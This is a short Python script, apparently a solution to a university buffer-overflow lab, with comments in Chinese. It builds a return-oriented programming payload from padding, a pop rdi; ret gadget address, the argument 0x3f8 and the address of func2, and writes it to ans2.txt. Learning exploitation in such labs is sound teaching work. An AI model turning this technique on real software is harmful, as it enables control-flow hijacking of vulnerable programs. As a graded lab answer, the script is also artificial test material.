import struct

#构造Padding
padding = b'A' * 16

#ROP Gadget地址
#汇编中找到的pop %rdi; ret地址
pop_rdi_ret_addr = 0x4012c7 

#参数值
#func2中cmpl $0x3f8, -0x4(%rbp)要求的比较值
arg_val = 0x3f8

#目标函数地址
func2_addr = 0x401216

#拼接 Payload
payload = padding
payload += struct.pack('<Q', pop_rdi_ret_addr) 
payload += struct.pack('<Q', arg_val)          
payload += struct.pack('<Q', func2_addr)       

#写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("ans2.txt generated successfully!")
